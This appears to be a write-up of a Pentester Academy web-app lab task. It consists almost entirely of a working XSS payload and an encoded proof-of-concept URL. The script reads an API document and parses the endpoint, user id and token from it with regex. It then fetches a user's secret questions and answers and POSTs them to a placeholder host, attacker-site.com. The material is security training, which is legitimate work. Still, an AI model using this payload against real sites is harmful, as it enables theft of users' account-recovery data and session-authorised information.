## Task 21 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/21)</small>

Objectives:

1. Find John's Secret Questions+Answers using an XSS vulnerability on this page
1. Display the Questions+Answers in the div with id "result"
1. Send the Questions+Answers to your Attack Server
1. No Hardcoded values can be used - everything has to be figured out dynamically

When you will see the API documentation, it is basically in XML and as per 4<sup>th</sup> point, everything should be dynamic.

So the regex that would be used are **`/<endpoint>(.+?)<\/endpoint>/`**, **`/<uid-param-value>(.+?)<\/uid-param-value>/`** and **`/<token-param-value>(.+?)<\/token-param-value>/`**

```js
let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    let ep = /<endpoint>(.+?)<\/endpoint>/.exec(this.responseText)[1];
    let uid = /<uid-param-value>(.+?)<\/uid-param-value>/.exec(this.responseText)[1];
    let tok = /<token-param-value>(.+?)<\/token-param-value>/.exec(this.responseText)[1];

    let xhr1 = new XMLHttpRequest();
    xhr1.onreadystatechange = function () {
      if (this.readyState == 4 && this.status == 200) {
        let xhr2 = new XMLHttpRequest();
        xhr2.open("POST", "http://attacker-site.com", true);
        xhr2.setRequestHeader("Content-Type", "application/json");
        xhr2.send(this.responseText);
      }
    };

    xhr1.open("GET", location.origin + ep + "?uid=" + uid + "&token=" + tok, true);
    xhr1.send();
  }
};

xhr.open("GET", document.querySelector("a").href, true);
xhr.send();
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/21?url=%3Cscript%3Elet%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhr.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20let%20ep%20%3D%20%2F%3Cendpoint%3E%28.%2B%3F%29%3C%5C%2Fendpoint%3E%2F.exec%28this.responseText%29%5B1%5D%3B%0A%20%20%20%20let%20uid%20%3D%20%2F%3Cuid-param-value%3E%28.%2B%3F%29%3C%5C%2Fuid-param-value%3E%2F.exec%28this.responseText%29%5B1%5D%3B%0A%20%20%20%20let%20tok%20%3D%20%2F%3Ctoken-param-value%3E%28.%2B%3F%29%3C%5C%2Ftoken-param-value%3E%2F.exec%28this.responseText%29%5B1%5D%3B%0A%0A%20%20%20%20let%20xhr1%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20xhr1.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20%20%20%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20%20%20%20%20let%20xhr2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr2.open%28%22POST%22%2C%20%22http%3A%2F%2Fattacker-site.com%22%2C%20true%29%3B%0A%20%20%20%20%20%20%20%20xhr2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fjson%22%29%3B%0A%20%20%20%20%20%20%20%20xhr2.send%28this.responseText%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20xhr1.open%28%22GET%22%2C%20location.origin%20%2B%20ep%20%2B%20%22%3Fuid%3D%22%20%2B%20uid%20%2B%20%22%26token%3D%22%20%2B%20tok%2C%20true%29%3B%0A%20%20%20%20xhr1.send%28%29%3B%0A%20%20%7D%0A%7D%3B%0A%0Axhr.open%28%22GET%22%2C%20document.querySelector%28%22a%22%29.href%2C%20true%29%3B%0Axhr.send%28%29%3B%3C%2Fscript%3E)
